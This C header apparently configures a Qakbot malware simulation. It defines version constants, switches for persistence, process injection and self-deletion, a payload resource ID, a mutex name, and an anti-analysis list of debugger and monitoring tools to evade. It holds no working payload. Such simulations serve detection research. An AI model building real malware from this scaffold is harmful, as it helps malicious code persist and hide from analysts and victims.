/**
 * qakbot_config.h - Qakbot Simulation Configuration
 * Mirrors the versioned build system and resource storage patterns
 */
#pragma once
#include <windows.h>

// Qakbot version tracking (real samples have this in .data section) [citation:2]
#define QBOT_MAJOR_VERSION 325
#define QBOT_MINOR_VERSION 43
#define QBOT_BUILD_TIMESTAMP 0x5F2A3B1C

// Command line parameters [citation:2]
#define QBOT_CMD_INSTALL   L"/C"   // Install persistence
#define QBOT_CMD_WAIT      L"/W"   // Wait before execution
#define QBOT_CMD_INJECT    L"/I"   // Inject into process
#define QBOT_CMD_PIPE      L"/P"   // Named pipe communication
#define QBOT_CMD_QUIT      L"/Q"   // Self-delete

// Resource ID for embedded payload (real Qakbot uses 307) [citation:2]
#define RESOURCE_PAYLOAD_ID 307

// Process blacklist for anti-analysis [citation:2]
[[maybe_unused]] static const WCHAR* ANALYSIS_TOOLS[] = {
    L"procmon.exe", L"procexp.exe", L"wireshark.exe",
    L"ollydbg.exe", L"x64dbg.exe", L"ida.exe",
    L"dumpcap.exe", L"tcpview.exe", L"autoruns.exe",
    NULL
};

// Mutex name for single instance
#define QBOT_MUTEX L"Global\\QBot_%08X_Session"
